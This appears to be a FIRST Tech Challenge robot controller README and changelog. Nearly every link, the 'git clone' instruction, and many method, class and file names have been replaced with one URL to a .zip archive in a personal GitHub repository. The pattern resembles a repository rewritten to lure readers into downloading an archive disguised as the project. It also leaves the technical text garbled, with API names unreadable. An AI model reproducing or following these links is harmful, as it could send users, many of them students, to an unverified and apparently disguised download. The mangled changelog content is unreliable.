...
## Getting Started
If you are new to robotics or new to the *FIRST* Tech Challenge, then you should consider reviewing the [FTC Blocks Tutorial](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) to get familiar with how to use the control system:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[FTC Blocks Online Tutorial](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)

Even if you are an advanced Java programmer, it is helpful to start with the [FTC Blocks tutorial](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip), and then migrate to the [OnBot Java Tool](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) or to [Android Studio](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) afterwards.
...
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;git clone https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip</p>

* Or, if you prefer, you can use the "Download Zip" button available through the main repository page.  Downloading the project as a .ZIP file will keep the size of the download manageable.

* You can also download the project folder (as a .zip or https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip archive file) from the Downloads subsection of the [Releases](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) page for this repository.
...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[FIRST Tech Challenge Documentation](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[FTC Javadoc Documentation](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)

### Online User Forum
For technical questions regarding the Control System or the FTC SDK, please visit the FIRST Tech Challenge Community site:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[FIRST Tech Challenge Community](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
The https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip file located in the [/TeamCode/src/main/java/org/firstinspires/ftc/teamcode](TeamCode/src/main/java/org/firstinspires/ftc/teamcode) folder contains an explanation of the sample naming convention, and instructions on how to copy them to your own project space.
...
### Bug Fixes
* Fixes https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip where https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() can cause an IndexOutOfBoundsError.
...
* [Issue #764](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) - Get gain control returns a null pointer for a switchable camera
...
* Adds Blocks to support comparing property values https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, and https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, to the corresponding enum Block.
...
* Several improvements to VisionPortal
  ...
  * VisionPortals now implement the `CameraStreamSource` interface, allowing multiportal users to select which portal is routed to the DS in INIT by calling https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip().setSource(visionPortal). Can be selected via gamepad, between Camera Stream sessions.
  ...
  * Added FTC Blocks counterparts to new Java methods:
    * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
    * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
    * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
    * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip​
...
* Updated CENTERSTAGE library AprilTag orientation quaternions
    * Thanks [@FromenActual](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Updated Java Sample https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip to include missing elements needed for custom model support.
...
* Blocks teams can now perform webcam calibration.
    * Added a Block for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip (under Utilities/Time)
    * Added a Block for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip (under Vision/VisionPortal)
...
* Fixes a bug where passing an integer number such as 123 to the https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip block that takes a number shows up as 123.0 in the telemetry.
...
* https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip has been moved.  It is still in the git history, but has been removed from the git snapshot corresponding with the 8.2 tag.  The official version now lives at [Field Coordinate System](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip).
* `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip()` and `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip()` have been replaced with `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip()`.
...
* Related documentation for associated technologies can be found at
    * [AprilTag Introduction](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
    * [AprilTag SDK Guide](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
    * [AprilTag Detection Values](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
    * [AprilTag Test Images](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
    * [Camera Calibration](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
### Bug Fixes
* Corrects inspection screen to report app version using the SDK version defined in the libraries instead of the version specified in `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`. This corrects the case where the app could show matching versions numbers to the user but still state that the versions did not match.
  * If the version specified in `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` does not match the SDK version, an SDK version entry will be displayed on the Manage webpage.
* Fixes no error being displayed when saving a configuration file with duplicate names from the Driver Station.
* Fixes a deadlock in the UVC driver which manifested in https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
...
* [Issue #492](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) - Can't create new blocks opmodes.
* [Issue #495](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) - Remove the final modifier from the OpMode's Telemetry object.
* [Issue #500](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) - Some devices cannot be configured when the Driver Station app has been updated to 8.1
...
* Deprecates (and stops respecting) `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`.
...
* Adds a new `IMU` interface to Blocks and Java that can be used with both the original BNO055 IMU
  ...
  * To learn how to use the new `IMU` interface, see https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip The `SensorIMU` Blocks sample was also updated to use the new `IMU` interface, and the following Java samples were added:
    * `SensorIMUOrthogonal`
  ...
  * If you have calibrated your BNO055, you can provide that calibration data to the new `IMU`
    interface by passing a `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` instance to `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip()`.
...
* Allows customized versions of device drivers in the FTC SDK to use the same XML tag.
  ...
  * Now, to use your custom driver, all you have to do is specify your custom driver's class when
    calling `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip()`. To go back to the original driver, specify the original driver
...
* Fixes [issue #251](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) by changing the order in which axis rotation rates are read from the angular velocity vector in the BNO055 IMU driver.
* Deprecates `pitchMode` in `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`.
  * Setting `pitchMode` to `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` would break the coordinate conventions used by the driver.
* Moves `OpModeManagerImpl` to the `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` package.
...
* Deletes the protected `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` class (which was not meant for use by OpModes).
...
* Adds new Java sample to demonstrate using a hardware class to abstract robot actuators, and share them across multiple OpModes.
  * Sample OpMode is [https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
  * Abstracted hardware class is [https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
* Adds opt-in support for Java 8 language features to the OnBotJava editor.
  ...
  * Please report issues [here](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip).
...
### Bug fixes
* Fixes [issue #316](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) (https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() returned an incorrectly-sized matrix for 1x1 and 2x2 matrixes).
...
* Removes https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip sample program.  This sample is not compatible with OnBotJava.
...
* Fixes [Blocks Programs Stripped of Blocks (due to using TensorFlow Label block)](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)

## Version 7.1 (20211223-120805)

* Fixes crash when calling `isPwmEnabled()` ([issue #223](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)).
* Fixes lint error ([issue #4](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)).
* Fixes Driver Station crash when attempting to use DualShock4 v1 gamepad with Advanced Gamepad Features enabled ([issue #173](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)).
...
* Fixes [issue #259](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) Most blocks samples for TensorFlow can't be used for a different model.
...
* Fixes [issue #260](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) Blocks can't call java method that has a VuforiaLocalizer parameter.
    * Blocks now has a block labeled https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip for this.
...
* Adds support for external libraries to OnBotJava and Blocks.
    ...
    * External libraries can provide support for hardware devices by using the annotation in the
      https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip package.
...
* Adds support for I2C transactions on the Expansion Hub / Control Hub without specifying a register address.
    * See section 3 of the [TI I2C spec](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip).
 ...
 * Fixes [FtcRobotController issue #114](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
### Bug fixes
* Fixes [FtcRobotController issue #71](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
  Cannot open OpModes in v6.1 Blocks offline editor
* Fixes [FtcRobotController issue #79](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
* Fixes certain I2C devices not showing up in the appropriate `HardwareMap` fields (such as `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`)
...
* Fixes [ftc_app issue 673](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) Latest matchlog is being deleted instead of old ones by RobotLog
...
* Makes the scan button on the configuration screen update the list of Expansion Hubs connected via RS-485
    * Fixes [SkyStone issue #143](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
* Introduces an automatic TeleOp preselection feature
    * For details and usage guide, please see [this wiki entry](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
### New features
* Adds support for calling custom Java classes from Blocks OpModes (fixes [SkyStone issue #161](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)).
    * Classes must be in the https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip package.
    * To have easy access to the opMode, hardwareMap, telemetry, gamepad1, and gamepad2, classes can
      extends https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
    * Methods must be public static and have no more than 21 parameters.
    * Methods must be annotated with https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
    ...
    * Parameters declared as char or https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip will accept any block that returns text
      and will only use the first character in the text.
    * Parameters declared as boolean or https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip will accept any block that returns boolean.
    * Parameters declared as byte, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, short, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, int, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip,
      long, or https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip,  will accept any block that returns a number and will round that
      value to the nearest whole number.
    * Parameters declared as float, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip, double, https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip will accept any
...
* Update/refresh build infrastructure
    * Update to 'androidx' support library from 'https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip', which is end-of-life
...
### Bug fixes
* Fixes [SkyStone issue #248](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Fixes [SkyStone issue #232](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) and
...
* Improves generation of fake serial numbers for UVC cameras which do not provide a real serial number
	...
	* Fixes [ftc_app issue #638](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip).
...
* Fixes issue in UVC driver on some devices ([ftc_app 681](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)) if streaming was started/stopped multiple times in a row
    * Issue manifested as kernel panic on devices which do not have [this kernel patch](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip).
...
* Fixes a potential exploitation issue of [CVE-2019-11358](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) in OnBotJava
...
* Fix RenderScript usage
    * Use https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip variant: increased compatibility
...
* Fixes [SkyStone issue #88](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Adds an inspection item that notes when a robot controller (Control Hub) is using the factory default password.
* Fixes [SkyStone issue #61](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Fixes [SkyStone issue #142](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Fixes [ftc_app issue #417](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) by adding more current and voltage monitoring capabilities for REV Hubs.
* Fixes [a crash sometimes caused by OnBotJava activity](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Improves OnBotJava autosave functionality [ftc_app #738](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
* Fixes issue where https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() would fail if it was called too early
* Adds https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() methods and blocks, which cause the Driver Station (if also updated) to speak text
...
* Adds bulk read functionality for REV Hubs
  ...
  * The following following Hub bulk caching modes are available:
    * `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` (default): All hardware calls operate as usual. Bulk data can read through `LynxModule#getBulkData()` and processed manually.
    * `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`: Applicable hardware calls are served from a bulk read cache that is cleared/refreshed automatically to ensure identical commands don't hit the same cache. The cache can also be cleared manually with `LynxModule#clearBulkCache()`, although this is not recommended.
    * (advanced users) `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip`: Same as `https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip` except the cache is never cleared automatically. To avoid getting stale data, the cache must be manually cleared at the beginning of each loop body or as the user deems appropriate.
...
* Fixes [ftc_app issue #712](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) (thanks to FROGbots-4634)
* Fixes [ftc_app issue #542](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
...
* Includes 64-bit support (to comply with [Google Play requirements](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)).
* Protects against Stuck OpModes when a Restart Robot is requested. (Thanks to FROGbots-4634) ([ftc_app issue #709](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip))
* Blocks related changes:
   ...
   * Displays warning icon when outdated Vuforia and TensorFlow blocks are used ([SkyStone issue #27](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip))
...
* Fixes [SkyStone issue #9](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
* Fixes [ftc_app issue #715](https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip)
 ...
 * Includes fix to avoid deadlock situation with WatchdogMonitor which could result in USB communication errors.
     ...
     - https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip would have error messages that included the words "E RobotCore: lynx xmit lock: #### abandoning lock:"
 ...
 * Added google() repo to https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip because aapt2 must be downloaded from the google() repository beginning with version 3.2 of the Android Gradle Plugin.
     ...
     - This should also fix buid issue where Android Studio would complain that it "Could not find https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip" (or similar).
 ...
 * Improvements to https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip block with "text" socket.
 ...
 * Initial support for UVC compatible cameras
    ...
    - Calibration settings for a few cameras are included (see https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip for details).
 ...
 * Removed unneeded resources from https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip binaries used by OnBot Java to reduce final size of Robot Controller app.
 ...
 * Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() statement for BlankLinearOpMode template.
 ...
 * Robot Controller log has been renamed to https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip (note that this change was actually introduced w/ v3.2).
 ...
 * Blocks
    ...
    - Added blocks for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip and https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
...
* Blocks Programming Development Tool:
    ...
    - Fixed tooltip for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip block.
    Added blocks for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip and https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
...
Changes include:
 * Blocks changes
    - Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip and https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip blocks.
    - Added optimized blocks support for Vuforia extended tracking.
    - Added atan2 block to the math category.
    - Added useCompetitionFieldTargetLocations parameter to https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip block.  If set to false, the target locations are placed at (0,0,0) with target orientation as specified in https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip tutorial OpMode.
...
## Version 2.5 (internal release on released on 16.12.13)
  * Blocks Programming mode changes:
     ...
     - Added Download OpMode button to https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
     ...
     - Added type safety to blocks for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
     ...
     - Added type safety to blocks for enums in https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
...
## Version 2.4 (released on 16.11.13)
  ...
  * Blocks Programming mode changes:
     ...
     - Added blocks to support https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
  ...
  * Limit unbounded growth of data for telemetry.  If user does not call https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() for LinearOpMode in a timely manner, data added for telemetry might get lost if size limit is exceeded.
 ...
 * Blockly enhancements
    - support for https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip
 ...
 * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() method has been overloaded so it can support this operation for int, short and byte integers.
 ...
 * For LinearOpMode the user now must for a https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() to update the telemetry data on the driver station.  This update() mechanism ensures that the driver station gets the updated data properly and at the same time.
 ...
 * Changes made to make the FTC SDK synchronous (significant change!)
    ...
    - For example, if you call setMode(https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip) for a motor, the encoder is guaranteed to be reset when the method call is complete.
 ...
 * Fixed formatting error in https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip().
 ...
 * https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip and .getConnectionInfo() return null
 ...
 * Added Support for Modern Robotics Gyro.
  ...
  - Example https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip OpMode included.
 ...
 * Updated/cleaned up OpModes.
  - Updated comments in https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip example OpMode.
  - Replaced the calls to "setChannelMode" with "setMode" (to match the new of the DcMotor  method).
  - Removed https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip OpMode.
  - Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip OpMode (demonstrates how to use MR Gyro Sensor).
  - Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip OpMode (demonstrates how to use MR Color Sensor).
  - Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip OpMode (demonstrates how to use HT legacy color sensor).
  - Added https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip (demonstrates how to use legacy Matrix controller).
 ...
 * Cleaned up https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip file.
 ...
 * A new LinearOpMode class is introduced.
   ...
   - Teams can use blocking statements like https://raw.githubusercontent.com/Lavanthi/327FtcRobotController/master/TeamCode/Ftc-Controller-Robot-v1.2.zip() within a linear OpMode.
